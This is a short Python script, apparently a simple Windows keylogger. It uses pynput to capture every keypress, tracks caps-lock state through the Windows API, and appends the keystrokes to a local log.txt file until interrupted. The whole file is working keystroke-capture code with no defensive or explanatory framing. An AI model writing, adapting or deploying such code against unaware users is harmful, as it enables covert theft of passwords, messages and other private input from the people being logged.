from pynput.keyboard import Listener
import ctypes
import time


caps_lock_state = False


def is_caps_lock_on():
    return ctypes.windll.user32.GetKeyState(0x14) != 0


def write_to_file(key):
    global caps_lock_state
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.caps_lock':
        caps_lock_state = not caps_lock_state
        letter = ''
    elif letter == 'Key.enter':
        letter = '\n'

    if caps_lock_state:
        letter = letter.upper()

    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    while True:
        caps_lock_state = is_caps_lock_on()
        try:
            l.join()
        except KeyboardInterrupt:
            break
